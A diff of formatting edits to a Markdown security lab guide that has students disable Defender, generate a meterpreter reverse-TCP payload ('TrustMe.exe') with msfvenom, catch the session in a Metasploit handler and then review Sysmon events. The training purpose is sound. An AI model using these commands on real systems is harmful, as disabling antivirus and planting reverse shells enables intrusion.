@@ -21,18 +21,19 @@ Here are just some groups that have used this attack:
 
 <img width="1082" height="691" alt="image" src="https://github.com/user-attachments/assets/634d0a14-def0-42da-9f23-0b26bb3faa07" />
 
+<br>
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
 <img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />
+
+<br>
 
 Next, run the following command in the **Powershell** terminal:
 
 ```ps
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-
-![](attachments/applocker_disabledefender.png)
 
 This will disable **Defender** for this session.
 
@@ -54,16 +55,15 @@ net user Administrator password1234
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
 
-Now we need a **Linux Terminal**
+Now we need a **Linux Terminal**.
 
-
-- **Double-click** `Ubuntu Shell` on Desktop
+**Double-click** `Ubuntu Shell` on the desktop:
 
 <img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
 
 
-Become root:
+Run the following command to become root:
 
 ```bash
 sudo su -
@@ -78,7 +78,9 @@ ifconfig
 
 <img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
 
-**REMEMBER: YOUR IP WILL BE DIFFERENT**
+>[!NOTE]
+>
+>**REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
@@ -90,12 +92,14 @@ cd /tmp/
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
-Let's start the **Metasploit** Handler. We need another **Linux Terminal**
+Let's start the **Metasploit** Handler. 
 
-- **Double-click** `Ubuntu Shell` on Desktop
+**Double-click** the `Ubuntu Shell` icon on the desktop to open another **Linux terminal**:
 
 <img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
+
+<br>
 
 Now let's start the **Metasploit** Handler
 
@@ -138,10 +142,15 @@ scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
 ```
 
 
-Now we will need to open a **"cmd.exe"** terminal as **Administrator**.
+Now we will need to open a **Command Prompt** terminal as **Administrator**. 
+
+Double-click the icon on the desktop:
 
 <img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/e8526cf1-0ed9-48f6-bd3f-f56af7536463" />
 
+<br>
+
+Once it opens, run the following:
 
 ```cmd
 cd \IntroLabs
@@ -171,6 +180,8 @@ TrustMe.exe
 Back at your **Linux terminal**, you should have a metasploit session!
 
 <img width="920" height="136" alt="2026-03-13_16-38" src="https://github.com/user-attachments/assets/35c77cf6-ec9a-4379-a359-c1984f221b72" />
+
+<br>
 
 Now, we need to view the Sysmon events for this malware:
 
